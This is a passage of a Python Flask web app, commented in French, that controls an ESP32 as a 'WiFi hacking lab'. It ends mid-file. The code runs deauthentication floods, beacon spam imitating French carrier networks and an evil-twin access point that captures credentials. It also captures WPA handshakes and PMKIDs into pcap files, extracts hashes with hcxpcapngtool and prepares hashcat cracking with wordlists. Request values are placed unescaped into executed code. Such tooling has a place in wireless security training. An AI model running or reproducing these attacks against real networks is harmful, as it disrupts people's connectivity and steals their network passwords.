#!/usr/bin/env python3
"""
Interface Web — ESP32 WiFi Hacking Lab
Serveur Flask local qui contrôle l'ESP32 via mpremote (port série).
Accès : http://localhost:8080  (ou http://<ip-kali>:8080 depuis le réseau)
"""

import json
import os
import queue
import re
import signal
import subprocess
import sys
import threading
import time
from pathlib import Path

_ANSI_RE = re.compile(r"\x1b\[[0-9;]*[mK]|\r")

def _strip_ansi(s: str) -> str:
    return _ANSI_RE.sub("", s)


def _extract_json(out: str) -> str:
    """Retourne la première ligne qui ressemble à du JSON ([ ou {)."""
    for line in reversed(out.splitlines()):
        line = _strip_ansi(line).strip()
        if line.startswith("[") or line.startswith("{"):
            return line
    return out

from flask import Flask, Response, jsonify, render_template, request, stream_with_context

# ── Config ────────────────────────────────────────────────────────────────────

PORT_SERIAL   = "/dev/ttyUSB0"
WEB_PORT      = 8080
BASE_DIR      = Path(__file__).parent.parent
VENV_PY       = BASE_DIR / ".venv/bin/python3"
MPREMOTE      = BASE_DIR / ".venv/bin/mpremote"
WORDLISTS_DIR = BASE_DIR / "captures" / "wordlists"

LED_MODULE_SRC = BASE_DIR / "src" / "lib" / "led_status.py"

SYSTEM_WORDLISTS = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/wordlists/fasttrack.txt",
    "/usr/share/wordlists/wifite.txt",
    "/usr/share/wordlists/fern-wifi/common.txt",
    "/usr/share/wordlists/john.lst",
]

app = Flask(__name__)

# ── LED Status ESP32 ──────────────────────────────────────────────────────────

_led_deployed = False   # le fichier est sur le flash ESP32, ce flag évite de re-uploader
_LED_VALID    = {"off","idle","scanning","capturing","cracking","found","error"}


def _led_deploy() -> bool:
    """Upload led_status.py sur l'ESP32 (toujours, pour s'assurer que c'est à jour)."""
    global _led_deployed
    if _led_deployed:
        return True
    if not LED_MODULE_SRC.exists():
        return False
    try:
        # Créer /lib si absent
        mp_exec("import os\ntry:\n os.mkdir('lib')\nexcept OSError:\n pass", timeout=5)
        r = subprocess.run(
            [str(MPREMOTE), "connect", PORT_SERIAL, "fs", "cp",
             str(LED_MODULE_SRC), ":lib/led_status.py"],
            capture_output=True, timeout=15
        )
        if r.returncode == 0:
            _led_deployed = True
    except Exception:
        pass
    return _led_deployed


def _led_set(mode: str):
    """Change l'état LED en tâche de fond — fire and forget."""
    if mode not in _LED_VALID:
        return
    def _run():
        _led_deploy()
        mp_exec(f"from lib.led_status import {mode}; {mode}()", timeout=5)
    threading.Thread(target=_run, daemon=True).start()


@app.route("/api/led/set", methods=["POST"])
def api_led_set():
    mode = (request.json or {}).get("mode", "idle")
    if mode not in _LED_VALID:
        return jsonify({"ok": False, "error": "Mode invalide"}), 400
    _led_set(mode)
    return jsonify({"ok": True, "mode": mode})


@app.route("/api/led/test")
def api_led_test():
    """Test : cycle à travers tous les états, 2s chacun."""
    def _cycle():
        for m in ["idle", "scanning", "capturing", "cracking", "found", "error", "idle"]:
            _led_set(m)
            time.sleep(2)
    threading.Thread(target=_cycle, daemon=True).start()
    return jsonify({"ok": True, "msg": "cycle LED démarré"})


# ── Helpers mpremote ──────────────────────────────────────────────────────────

def mp_exec(code: str, timeout: int = 15) -> dict:
    """Exécute du code MicroPython sur l'ESP32 via mpremote exec."""
    cmd = [str(MPREMOTE), "connect", PORT_SERIAL, "exec", code]
    try:
        result = subprocess.run(
            cmd, capture_output=True, timeout=timeout
        )
        out = _strip_ansi(result.stdout.decode("utf-8", errors="replace").strip())
        err = _strip_ansi(result.stderr.decode("utf-8", errors="replace").strip())
        return {"ok": result.returncode == 0, "out": out, "err": err}
    except subprocess.TimeoutExpired:
        return {"ok": False, "out": "", "err": "Timeout"}
    except Exception as e:
        return {"ok": False, "out": "", "err": str(e)}


def mp_stream(code: str, timeout: int = 30):
    """Générateur SSE : exécute du code et streame la sortie ligne par ligne."""
    cmd = [str(MPREMOTE), "connect", PORT_SERIAL, "exec", code]
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )
        deadline = time.time() + timeout
        for line in proc.stdout:
            yield f"data: {json.dumps(line.rstrip())}\n\n"
            if time.time() > deadline:
                proc.terminate()
                yield "data: \"[Timeout]\"\n\n"
                break
        proc.wait()
    except Exception as e:
        yield f"data: {json.dumps('[Erreur: ' + str(e) + ']')}\n\n"
    yield "data: \"__END__\"\n\n"


def esp32_status() -> dict:
    r = mp_exec(
        "import gc, sys\n"
        "gc.collect()\n"
        "print(sys.version)\n"
        "print(gc.mem_free())\n"
        "import esp; print(hasattr(esp,'wifi_send_pkt_freedom'))\n"
    )
    if not r["ok"]:
        return {"connected": False, "firmware": "—", "ram": 0, "custom": False}
    lines = r["out"].splitlines()
    return {
        "connected": True,
        "firmware": lines[0] if len(lines) > 0 else "—",
        "ram": int(lines[1]) if len(lines) > 1 and lines[1].isdigit() else 0,
        "custom": lines[2].strip() == "True" if len(lines) > 2 else False,
    }

# ── Routes : pages ────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html", serial_port=PORT_SERIAL)

# ── Routes : API JSON ─────────────────────────────────────────────────────────

@app.route("/api/status")
def api_status():
    return jsonify(esp32_status())


@app.route("/api/scan", methods=["POST"])
def api_scan():
    r = mp_exec(
        "from lib.wifi_scanner import scan\n"
        "import json\n"
        "nets = scan(verbose=False)\n"
        "for n in nets: n.pop('bssid_b', None)\n"
        "print(json.dumps(nets))\n",
        timeout=20,
    )
    if not r["ok"]:
        return jsonify({"ok": False, "error": r["err"]}), 500
    try:
        nets = json.loads(_extract_json(r["out"]))
        return jsonify({"ok": True, "networks": nets})
    except Exception:
        return jsonify({"ok": False, "error": "Parse error: " + r["out"]}), 500


@app.route("/api/deauth/broadcast", methods=["POST"])
def api_deauth_broadcast():
    data  = request.json or {}
    bssid = data.get("bssid", "")
    count = int(data.get("count", 100))
    ch    = int(data.get("channel", 6))
    if not bssid:
        return jsonify({"ok": False, "error": "BSSID manquant"}), 400
    code = (
        f"from lib.deauth import deauth_broadcast\n"
        f"n = deauth_broadcast('{bssid}', count={count}, channel={ch})\n"
        f"print(n)\n"
    )
    r = mp_exec(code, timeout=count // 5 + 10)
    return jsonify({"ok": r["ok"], "sent": r["out"], "error": r["err"]})


@app.route("/api/deauth/client", methods=["POST"])
def api_deauth_client():
    data       = request.json or {}
    bssid      = data.get("bssid", "")
    client_mac = data.get("client_mac", "")
    count      = int(data.get("count", 100))
    ch         = int(data.get("channel", 6))
    if not bssid or not client_mac:
        return jsonify({"ok": False, "error": "BSSID et client_mac requis"}), 400
    code = (
        f"from lib.deauth import deauth_client\n"
        f"n = deauth_client('{bssid}', '{client_mac}', count={count}, channel={ch})\n"
        f"print(n)\n"
    )
    r = mp_exec(code, timeout=count // 5 + 10)
    return jsonify({"ok": r["ok"], "sent": r["out"], "error": r["err"]})


@app.route("/api/beacon/spam", methods=["POST"])
def api_beacon_spam():
    """Envoi ponctuel (N trames) — pour tester."""
    data   = request.json or {}
    mode   = data.get("mode", "random")
    ssid   = data.get("ssid", "")
    ch     = int(data.get("channel", 6))
    count  = int(data.get("count", 50))
    custom = data.get("custom_ssids", [])
    if mode == "random":
        code = f"from lib.beacon_spam import spam_random\nspam_random(channel={ch}, count={count})\nprint('OK')\n"
    elif mode == "fr":
        code = f"from lib.beacon_spam import spam_fr\nspam_fr(channel={ch})\nprint('OK')\n"
    elif mode == "clone" and ssid:
        code = f"from lib.beacon_spam import spam_clone\nspam_clone('{ssid}', channel={ch}, count={count})\nprint('OK')\n"
    elif mode == "custom" and custom:
        ssids_repr = repr(custom)
        code = f"from lib.beacon_spam import spam\nspam(ssids={ssids_repr}, channel={ch}, count={count})\nprint('OK')\n"
    else:
        return jsonify({"ok": False, "error": "Mode invalide ou données manquantes"}), 400
    r = mp_exec(code, timeout=30)
    return jsonify({"ok": r["ok"], "out": r["out"], "error": r["err"]})


# ── Beacon continu ────────────────────────────────────────────────────────────
_beacon_proc:  subprocess.Popen | None = None
_beacon_lock   = threading.Lock()
_beacon_ssids: list[str] = []   # liste des SSIDs actuellement diffusés

# SSIDs opérateurs français (miroir de beacon_spam.py)
_SSIDS_FR = [
    "FreeWifi","FreeWifi_secure","Freebox-ABCD","Free 5G",
    "Livebox-1234","Livebox Fibre","Orange_XXXX","Orange 5G",
    "SFR_BCDE","SFR WiFi FON","SFR-XXXX",
    "Bbox-ABCD","BBox-XXXX",
    "DIRECT-Samsung","DIRECT-Printer",
    "iPhone de Marc","Android AP","Redmi Note 12",
    "_nomap","xfinitywifi","NETGEAR_EXT",
]


@app.route("/api/beacon/start", methods=["POST"])
def api_beacon_start():
    global _beacon_proc, _beacon_ssids
    data      = request.json or {}
    mode      = data.get("mode", "random")
    ssid      = data.get("ssid", "")
    ch        = int(data.get("channel", 6))
    custom    = data.get("custom_ssids", [])   # liste envoyée par le client

    with _beacon_lock:
        if _beacon_proc and _beacon_proc.poll() is None:
            return jsonify({"ok": False, "error": "Beacon spam déjà en cours"}), 409

        if mode == "random":
            code = f"from lib.beacon_spam import spam_random\nspam_random(channel={ch}, count=0)\n"
            _beacon_ssids = ["[aléatoires]"]
        elif mode == "fr":
            code = f"from lib.beacon_spam import spam_fr\nspam_fr(channel={ch})\n"
            _beacon_ssids = _SSIDS_FR[:]
        elif mode == "clone" and ssid:
            code = f"from lib.beacon_spam import spam_clone\nspam_clone('{ssid}', channel={ch}, count=0)\n"
            _beacon_ssids = [ssid]
        elif mode == "custom" and custom:
            # Passe la liste custom au spam() via une représentation Python
            ssids_repr = repr(custom)
            code = f"from lib.beacon_spam import spam\nspam(ssids={ssids_repr}, channel={ch}, count=0)\n"
            _beacon_ssids = custom[:]
        else:
            return jsonify({"ok": False, "error": "Mode invalide ou données manquantes"}), 400

        cmd = [str(MPREMOTE), "connect", PORT_SERIAL, "exec", code]
        _beacon_proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )

    time.sleep(4)
    running = _beacon_proc.poll() is None
    if not running:
        out = _beacon_proc.stdout.read() if _beacon_proc.stdout else b""
        _beacon_ssids = []
        return jsonify({"ok": False, "status": "failed", "error": out.decode("utf-8", errors="replace")[:300]})
    return jsonify({"ok": True, "status": "running", "ssids": _beacon_ssids})


@app.route("/api/beacon/stop", methods=["POST"])
def api_beacon_stop():
    global _beacon_proc, _beacon_ssids
    with _beacon_lock:
        if not _beacon_proc or _beacon_proc.poll() is not None:
            _beacon_ssids = []
            return jsonify({"ok": True, "status": "already stopped"})
        _beacon_proc.terminate()
        try:
            _beacon_proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            _beacon_proc.kill()
        _beacon_ssids = []
    return jsonify({"ok": True, "status": "stopped"})


@app.route("/api/beacon/status")
def api_beacon_status():
    with _beacon_lock:
        running = _beacon_proc is not None and _beacon_proc.poll() is None
        ssids   = _beacon_ssids[:] if running else []
    return jsonify({"running": running, "ssids": ssids})


@app.route("/api/pmf_check", methods=["POST"])
def api_pmf_check():
    """Lit le RSN IE du beacon de la cible et détecte PMF (802.11w)."""
    data     = request.json or {}
    bssid_s  = data.get("bssid", "").replace(":", "").lower()
    if len(bssid_s) != 12:
        return jsonify({"ok": False, "error": "BSSID invalide"}), 400

    ch = int(data.get("channel", 6))
    code = f"""
import esp, network, utime
sta = network.WLAN(network.STA_IF)
sta.active(True)
# Se placer sur le bon canal avant d'activer promiscuous
sta.config(channel={ch})
utime.sleep_ms(100)
esp.wifi_set_promiscuous(True)
target = bytes.fromhex('{bssid_s}')
mfpc = False; mfpr = False; found = False
deadline = utime.ticks_add(utime.ticks_ms(), 6000)
while utime.ticks_diff(deadline, utime.ticks_ms()) > 0:
    pkt = esp.wifi_get_pkt()
    if not pkt or len(pkt) < 38 or pkt[0] != 0x80: continue
    if pkt[10:16] != target: continue
    body = pkt[36:]; i = 0
    while i < len(body) - 2:
        tag = body[i]; ln = body[i+1]
        if tag == 48 and i+2+ln <= len(body):
            rsn = body[i+2:i+2+ln]
            if len(rsn) >= 10:
                pc  = rsn[6] | (rsn[7] << 8)   # pairwise count après version(2)+group(4)
                off = 8 + pc * 4                # debut section AKM
                if off + 2 <= len(rsn):
                    ac   = rsn[off] | (rsn[off+1] << 8)
                    off2 = off + 2 + ac * 4     # debut RSN capabilities
                    if off2 + 1 <= len(rsn):
                        cap0 = rsn[off2]
                        mfpc = bool(cap0 & 0x80)   # bit7 = MFPC
                        mfpr = bool(cap0 & 0x40)   # bit6 = MFPR
            found = True; break
        i += 2 + ln
    if found: break
    utime.sleep_ms(10)
esp.wifi_set_promiscuous(False)
print('FOUND=' + str(int(found)) + ' MFPC=' + str(int(mfpc)) + ' MFPR=' + str(int(mfpr)))
"""
    r = mp_exec(code, timeout=9)
    out = r["out"]
    found = "FOUND=1" in out
    mfpc  = "MFPC=1"  in out
    mfpr  = "MFPR=1"  in out
    return jsonify({"ok": True, "found": found, "pmf_capable": mfpc, "pmf_required": mfpr})


@app.route("/api/sniff/start", methods=["POST"])
def api_sniff_start():
    data    = request.json or {}
    dur     = int(data.get("duration", 10))
    channel = data.get("channel")
    if channel:
        code = f"from lib.packet_sniffer import sniff\nsniff(duration={dur}, channel={int(channel)})\nprint('OK')\n"
    else:
        code = f"from lib.packet_sniffer import sniff\nsniff(duration={dur})\nprint('OK')\n"
    r = mp_exec(code, timeout=dur + 10)
    return jsonify({"ok": r["ok"], "out": r["out"], "error": r["err"]})


@app.route("/api/probe/start", methods=["POST"])
def api_probe_start():
    data    = request.json or {}
    dur     = int(data.get("duration", 15))
    channel = data.get("channel")
    if channel:
        code = f"from lib.probe_sniffer import sniff_probes\nsniff_probes(duration={dur}, channel={int(channel)})\nprint('OK')\n"
    else:
        code = f"from lib.probe_sniffer import sniff_probes\nsniff_probes(duration={dur})\nprint('OK')\n"
    r = mp_exec(code, timeout=dur + 10)
    return jsonify({"ok": r["ok"], "out": r["out"], "error": r["err"]})


# ── Evil Twin : processus de fond ────────────────────────────────────────────
_et_proc: subprocess.Popen | None = None
_et_lock = threading.Lock()


@app.route("/api/eviltwin/start", methods=["POST"])
def api_eviltwin_start():
    global _et_proc
    data         = request.json or {}
    ssid         = data.get("ssid", "")
    ch           = int(data.get("channel", 6))
    deauth_bssid = data.get("deauth_bssid", "")
    if not ssid:
        return jsonify({"ok": False, "error": "SSID requis"}), 400

    with _et_lock:
        if _et_proc and _et_proc.poll() is None:
            return jsonify({"ok": False, "error": "Evil Twin déjà en cours"}), 409

        if deauth_bssid:
            code = (
                f"from lib.evil_twin import start\n"
                f"start('{ssid}', channel={ch}, deauth_ap_mac='{deauth_bssid}')\n"
            )
        else:
            code = f"from lib.evil_twin import start\nstart('{ssid}', channel={ch})\n"

        cmd = [str(MPREMOTE), "connect", PORT_SERIAL, "exec", code]
        _et_proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )

    # Attendre 2s pour confirmer le démarrage
    time.sleep(2)
    running = _et_proc.poll() is None
    return jsonify({"ok": running, "pid": _et_proc.pid,
                    "status": "running" if running else "failed"})


@app.route("/api/eviltwin/stop", methods=["POST"])
def api_eviltwin_stop():
    global _et_proc
    with _et_lock:
        if not _et_proc or _et_proc.poll() is not None:
            return jsonify({"ok": True, "status": "already stopped"})
        _et_proc.terminate()
        try:
            _et_proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            _et_proc.kill()
    return jsonify({"ok": True, "status": "stopped"})


@app.route("/api/eviltwin/status")
def api_eviltwin_status():
    with _et_lock:
        running = _et_proc is not None and _et_proc.poll() is None
    return jsonify({"running": running})


@app.route("/api/eviltwin/captures")
def api_eviltwin_captures():
    r = mp_exec(
        "from lib.evil_twin import show_captured\nshow_captured()\n"
    )
    return jsonify({"ok": r["ok"], "out": r["out"]})


# ── Route SSE : streaming temps réel ─────────────────────────────────────────

@app.route("/api/stream/scan")
def stream_scan():
    code = (
        "from lib.wifi_scanner import scan\n"
        "nets = scan(verbose=True)\n"
        "print('--- FIN ---', len(nets), 'réseaux')\n"
    )
    return Response(
        stream_with_context(mp_stream(code, timeout=25)),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


@app.route("/api/stream/sniff")
def stream_sniff():
    dur = request.args.get("duration", "10")
    ch  = request.args.get("channel", "")
    if ch:
        code = f"from lib.packet_sniffer import sniff\nsniff(duration={dur}, channel={ch})\n"
    else:
        code = f"from lib.packet_sniffer import sniff\nsniff(duration={dur})\n"
    return Response(
        stream_with_context(mp_stream(code, timeout=int(dur) + 15)),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


@app.route("/api/stream/probe")
def stream_probe():
    dur = request.args.get("duration", "15")
    code = f"from lib.probe_sniffer import sniff_probes\nsniff_probes(duration={dur})\n"
    return Response(
        stream_with_context(mp_stream(code, timeout=int(dur) + 15)),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


# ── PMKID Capture via ESP32 ──────────────────────────────────────────────────

import struct

_PCAP_GLOBAL = struct.pack('<IHHiIII',
    0xa1b2c3d4, 2, 4, 0, 0, 65535, 105)  # DLT_IEEE802_11 = 105

def _frames_to_pcap(frames: list[tuple]) -> bytes:
    """Convertit une liste de (timestamp_ms, hex) en fichier pcap binaire."""
    buf = bytearray(_PCAP_GLOBAL)
    for ts_ms, h in frames:
        try:
            data = bytes.fromhex(h.strip())
        except ValueError:
            continue
        ts_sec  = ts_ms // 1000
        ts_usec = (ts_ms % 1000) * 1000
        hdr = struct.pack('<IIII', ts_sec, ts_usec, len(data), len(data))
        buf += hdr + data
    return bytes(buf)


@app.route("/api/stream/pmkid")
def stream_pmkid():
    """SSE — Capture EAPOL via ESP32 promiscuous, écrit pcap, extrait hash."""
    bssid_s = request.args.get("bssid", "").replace(":", "").lower()
    ch      = int(request.args.get("channel", 6))
    dur     = int(request.args.get("duration", 60))
    ssid    = request.args.get("ssid", "target")
    if len(bssid_s) != 12:
        return Response("data: " + json.dumps("BSSID invalide") + "\n\n",
                        mimetype="text/event-stream")

    cap_dir  = BASE_DIR / "captures"
    cap_dir.mkdir(exist_ok=True)
    pcap_path = cap_dir / f"pmkid_{bssid_s}.pcap"
    hash_path = cap_dir / f"pmkid_{bssid_s}.hc22000"

    # Code MicroPython : capture Beacon + Auth + Assoc + EAPOL depuis l'AP cible
    code = f"""
import esp, network, utime, ubinascii
sta = network.WLAN(network.STA_IF)
sta.active(True)
sta.config(channel={ch})
utime.sleep_ms(300)
esp.wifi_set_promiscuous(True)
target = bytes.fromhex('{bssid_s}')
deadline = utime.ticks_add(utime.ticks_ms(), {dur * 1000})
t0 = utime.ticks_ms()
eapol_count = 0
beacon_sent = False
print('STATUS:ready')
while utime.ticks_diff(deadline, utime.ticks_ms()) > 0:
    pkt = esp.wifi_get_pkt()
    if not pkt or len(pkt) < 24:
        utime.sleep_ms(1)
        continue
    ts = utime.ticks_diff(utime.ticks_ms(), t0)
    fc0 = pkt[0]; fc1 = pkt[1]
    ftype = fc0 & 0x0c
    fsub  = (fc0 >> 4) & 0x0f
    # --- Beacon (0x80) : capturer pour fournir le SSID ---
    if fc0 == 0x80 and len(pkt) >= 34:
        src = pkt[10:16]
        if src == target:
            print('FRAME:' + str(ts) + ':' + ubinascii.hexlify(pkt).decode())
            if not beacon_sent:
                beacon_sent = True
                print('STATUS:beacon')
        continue
    # --- Auth + Assoc (mgmt type 0x00) ---
    if ftype == 0x00 and fsub in (0, 1, 2, 3, 11, 12):
        if target in (pkt[4:10], pkt[10:16], pkt[16:22]):
            print('FRAME:' + str(ts) + ':' + ubinascii.hexlify(pkt).decode())
        continue
    # --- Data frames : chercher EAPOL ---
    if ftype != 0x08:
        continue
    if target not in (pkt[4:10], pkt[10:16], pkt[16:22]):
        continue
    # Chercher LLC EAPOL AA AA 03 00 00 00 88 8E
    found = -1
    for off in (24, 26, 28, 30):
        if off + 8 <= len(pkt) and pkt[off:off+6] == b'\\xaa\\xaa\\x03\\x00\\x00\\x00' and pkt[off+6:off+8] == b'\\x88\\x8e':
            found = off; break
    if found < 0:
        continue
    eoff = found + 8
    if eoff + 2 > len(pkt) or pkt[eoff+1] != 3:
        continue
    eapol_count += 1
    print('FRAME:' + str(ts) + ':' + ubinascii.hexlify(pkt).decode())
    print('STATUS:eapol:' + str(eapol_count))
esp.wifi_set_promiscuous(False)
print('STATUS:done:' + str(eapol_count))
"""

    def generate():
        frames = []   # liste de (ts_ms, hex)
        _led_set("capturing")
        proc = subprocess.Popen(
            [str(MPREMOTE), "connect", PORT_SERIAL, "exec", code],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )
        yield f"data: {json.dumps('[*] ESP32 capture promiscuous ch' + str(ch) + ' — Beacon + Auth + EAPOL…')}\n\n"
        yield f"data: {json.dumps('[*] Reconnectez votre appareil à « ' + ssid + ' »')}\n\n"

        try:
            for raw in proc.stdout:
                line = _strip_ansi(raw.decode("utf-8", errors="replace")).strip()
                if not line:
                    continue
                if line.startswith("FRAME:"):
                    parts = line.split(":", 2)
                    if len(parts) == 3:
                        ts_ms = int(parts[1]) if parts[1].isdigit() else 0
                        frames.append((ts_ms, parts[2]))
                elif line.startswith("STATUS:ready"):
                    yield f"data: {json.dumps('[+] ESP32 prêt — en écoute…')}\n\n"
                elif line.startswith("STATUS:beacon"):
                    yield f"data: {json.dumps('[+] Beacon capturé (SSID inclus dans le pcap) ✓')}\n\n"
                elif line.startswith("STATUS:eapol:"):
                    n = line.split(":")[-1]
                    yield f"data: {json.dumps('[+] Trame EAPOL #' + n + ' capturée !')}\n\n"
                elif line.startswith("STATUS:done:"):
                    n = line.split(":")[-1]
                    yield f"data: {json.dumps('[*] Capture terminée — ' + n + ' trame(s) EAPOL + ' + str(len(frames)) + ' frames total')}\n\n"
        except Exception as e:
            yield f"data: {json.dumps('[x] Erreur : ' + str(e))}\n\n"
        finally:
            proc.terminate()

        eapol_frames = [f for f in frames if len(f[1]) > 48]
        if not eapol_frames:
            yield f"data: {json.dumps('[x] Aucune trame EAPOL — reconnectez un appareil à « ' + ssid + ' »')}\n\n"
            yield "data: \"__END__\"\n\n"
            return

        # Écrire le pcap avec timestamps réels
        yield f"data: {json.dumps('[*] Écriture pcap (' + str(len(frames)) + ' frames, timestamps réels)…')}\n\n"
        pcap_path.write_bytes(_frames_to_pcap(frames))
        yield f"data: {json.dumps('[+] pcap : ' + str(pcap_path))}\n\n"

        # Extraire le hash avec hcxpcapngtool
        yield f"data: {json.dumps('[*] Extraction hash hc22000 (hcxpcapngtool)…')}\n\n"
        r = subprocess.run(
            ["hcxpcapngtool", "-o", str(hash_path), str(pcap_path)],
            capture_output=True, text=True
        )
        # Afficher le résumé complet ligne par ligne
        for out_line in (r.stdout + r.stderr).splitlines():
            out_line = out_line.strip()
            if not out_line:
                continue
            if any(k in out_line for k in ("EAPOL", "PMKID", "hash", "pairs", "M1", "M2", "M3", "M4", "written")):
                yield f"data: {json.dumps('[>] ' + out_line)}\n\n"

        if hash_path.exists() and hash_path.stat().st_size > 0:
            hashes = hash_path.read_text().strip().splitlines()
            yield f"data: {json.dumps('[+] ' + str(len(hashes)) + ' hash(es) extrait(s) !')}\n\n"
            for h in hashes:
                yield f"data: {json.dumps('HASH:' + h)}\n\n"
            _led_set("idle")
        else:
            hcx_out = r.stdout + r.stderr
            missing_m1 = ("does not contain enough EAPOL M1" in hcx_out
                          or "missing EAPOL M1" in hcx_out
                          or "no M1" in hcx_out.lower())
            missing_m3 = ("missing EAPOL M3" in hcx_out
                          or "no M3" in hcx_out.lower())
            eapol_count = len([f for f in frames if len(f[1]) > 48])
            diag = {
                "missing_m1":   missing_m1,
                "missing_m3":   missing_m3,
                "eapol_count":  eapol_count,
                "total_frames": len(frames),
                "pcap_path":    str(pcap_path),
                "bssid":        bssid_s,
            }
            yield f"data: {json.dumps('[!] Hash non extrait — handshake incomplet')}\n\n"
            yield f"data: {json.dumps('DIAG:' + json.dumps(diag))}\n\n"
            _led_set("error")

        yield "data: \"__END__\"\n\n"

    return Response(
        stream_with_context(generate()),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


@app.route("/api/stream/pmkid_retry_all")
def stream_pmkid_retry_all():
    """SSE — Réessaye hcxpcapngtool avec --all sur le pcap existant."""
    bssid_s   = request.args.get("bssid", "").replace(":", "").lower()
    cap_dir   = BASE_DIR / "captures"
    pcap_path = cap_dir / f"pmkid_{bssid_s}.pcap"
    hash_path = cap_dir / f"pmkid_{bssid_s}.hc22000"

    def generate():
        if not pcap_path.exists():
            yield f"data: {json.dumps('[x] Fichier pcap introuvable : ' + str(pcap_path))}\n\n"
            yield "data: \"__END__\"\n\n"
            return

        yield f"data: {json.dumps('[*] Tentative hcxpcapngtool --all (accepte paires incomplètes)…')}\n\n"
        r = subprocess.run(
            ["hcxpcapngtool", "--all", "-o", str(hash_path), str(pcap_path)],
            capture_output=True, text=True
        )
        for out_line in (r.stdout + r.stderr).splitlines():
            out_line = out_line.strip()
            if not out_line:
                continue
            if any(k in out_line for k in ("EAPOL", "PMKID", "hash", "pairs", "M1", "M2", "M3", "M4", "written")):
                yield f"data: {json.dumps('[>] ' + out_line)}\n\n"

        if hash_path.exists() and hash_path.stat().st_size > 0:
            hashes = hash_path.read_text().strip().splitlines()
            yield f"data: {json.dumps('[+] ' + str(len(hashes)) + ' hash(es) extrait(s) avec --all !')}\n\n"
            for h in hashes:
                yield f"data: {json.dumps('HASH:' + h)}\n\n"
        else:
            yield f"data: {json.dumps('[!] Toujours aucun hash — une seule trame EAPOL insuffisante')}\n\n"
            yield f"data: {json.dumps('[→] Relancez la capture et déconnectez un appareil client pour déclencher un handshake complet')}\n\n"

        yield "data: \"__END__\"\n\n"

    return Response(
        stream_with_context(generate()), mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


@app.route("/api/wordlists")
def api_wordlists():
    """Liste les wordlists disponibles (système + custom captures/wordlists/)."""
    lists = []
    for p in SYSTEM_WORDLISTS:
        path = Path(p)
        if path.exists():
            lists.append({"name": path.name, "path": str(path),
                          "size": path.stat().st_size, "type": "system"})
    WORDLISTS_DIR.mkdir(parents=True, exist_ok=True)
    for p in sorted(WORDLISTS_DIR.glob("*.txt")):
        lists.append({"name": p.name, "path": str(p),
                      "size": p.stat().st_size, "type": "custom"})
    return jsonify({"ok": True, "lists": lists})


@app.route("/api/wordlists/build")
def api_wordlists_build():
    """SSE : génère une wordlist via crunch et streame la progression."""
    min_len = request.args.get("min", "8")
    max_len = request.args.get("max", "8")
    charset = request.args.get("charset", "0123456789")
    pattern = request.args.get("pattern", "")
    name    = re.sub(r"[^a-zA-Z0-9_\-]", "_", request.args.get("name", "custom"))
    append  = request.args.get("append", "")   # chemin d'une liste existante à enrichir

    WORDLISTS_DIR.mkdir(parents=True, exist_ok=True)
    out_file = WORDLISTS_DIR / f"{name}.txt"

    def generate():
        if pattern:
            # crunch -t exige min=max=len(pattern) — on force automatiquement
            pat_len = str(len(pattern))
            cmd = ["crunch", pat_len, pat_len, "-t", pattern, "-o", str(out_file)]
        else:
            cmd = ["crunch", min_len, max_len, charset, "-o", str(out_file)]

        yield f"data: {json.dumps({'status': 'cmd', 'msg': ' '.join(cmd)})}\n\n"
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in proc.stdout:
                line = line.strip()
                if line:
                    yield f"data: {json.dumps({'status': 'log', 'msg': line})}\n\n"
            proc.wait()

            if out_file.exists() and out_file.stat().st_size > 0:
                with open(out_file) as f:
                    added = sum(1 for _ in f)

                if append and Path(append).exists():
                    with open(append, "a") as dst, open(out_file) as src:
                        dst.write(src.read())
                    out_file.unlink()
                    target = Path(append)
                    with open(target) as f:
                        total = sum(1 for _ in f)
                    yield f"data: {json.dumps({'status': 'done', 'path': str(target), 'name': target.name, 'added': added, 'total': total})}\n\n"
                else:
                    yield f"data: {json.dumps({'status': 'done', 'path': str(out_file), 'name': out_file.name, 'added': added, 'total': added})}\n\n"
            else:
                yield f"data: {json.dumps({'status': 'error', 'msg': 'Fichier vide ou non généré'})}\n\n"
        except Exception as exc:
            yield f"data: {json.dumps({'status': 'error', 'msg': str(exc)})}\n\n"

    return Response(stream_with_context(generate()), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


@app.route("/api/hashcat/devices")
def api_hashcat_devices():
    """Détecte les devices hashcat disponibles (GPU/CPU)."""
    r = subprocess.run(["hashcat", "-I", "--force"],
                       capture_output=True, text=True, timeout=10)
    devices = []
    current = {}
    for line in (r.stdout + r.stderr).splitlines():
        line = line.strip()
        if line.startswith("Backend Device ID"):
            if current:
                devices.append(current)
            dev_id = line.split("#")[-1].strip()
            current = {"id": dev_id, "type": "?", "name": "Unknown"}
        elif "Type" in line and "........." in line:
            current["type"] = line.split(":")[-1].strip()
        elif "Name" in line and "........." in line and current:
            current["name"] = line.split(":")[-1].strip()
    if current:
        devices.append(current)
    return jsonify({"ok": True, "devices": devices})


_hashcat_proc = None   # référence globale pour pouvoir tuer le process


def _kill_proc(proc):
    """Tue le process et tout son groupe — SIGTERM puis SIGKILL si nécessaire."""
    if proc is None or proc.poll() is not None:
        return
    try:
        pgid = os.getpgid(proc.pid)
        os.killpg(pgid, signal.SIGTERM)
        time.sleep(0.5)
        if proc.poll() is None:          # toujours vivant → force kill
            os.killpg(pgid, signal.SIGKILL)
    except (ProcessLookupError, PermissionError):
        try:
            proc.kill()
        except Exception:
            pass


@app.route("/api/hashcat/stop", methods=["POST"])
